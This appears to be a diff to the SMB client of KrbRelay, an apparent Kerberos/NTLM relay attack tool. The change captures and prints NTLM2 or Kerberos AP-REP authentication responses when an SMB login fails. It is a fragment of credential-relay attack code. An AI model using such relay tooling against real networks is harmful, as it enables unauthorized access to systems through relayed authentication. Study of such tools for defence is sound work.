@@ -8,8 +8,21 @@ namespace KrbRelay.Clients
     {
         public static void Connect()
         {
-            apRep1 = smbClient.Login(ticket, out bool success);
-            if (success)
+            byte[] response = smbClient.Login(ticket, out bool success);
+            if (!success)
+            {
+                if (Program.ntlm)
+                {
+                    ntlm2 = response;
+                    Console.WriteLine("[*] NTLM2: {0}", Helpers.ByteArrayToString(ntlm2));
+                }
+                else
+                {
+                    apRep1 = response;
+                    Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
+                }
+            }
+            else
             {
                 Console.WriteLine("[+] SMB session established");
 
@@ -46,10 +59,6 @@ namespace KrbRelay.Clients
                 smbClient.Logoff();
                 smbClient.Disconnect();
                 Environment.Exit(0);
-            }
-            else
-            {
-                Console.WriteLine("[*] apRep1: {0}", Helpers.ByteArrayToString(apRep1));
             }
         }
     }
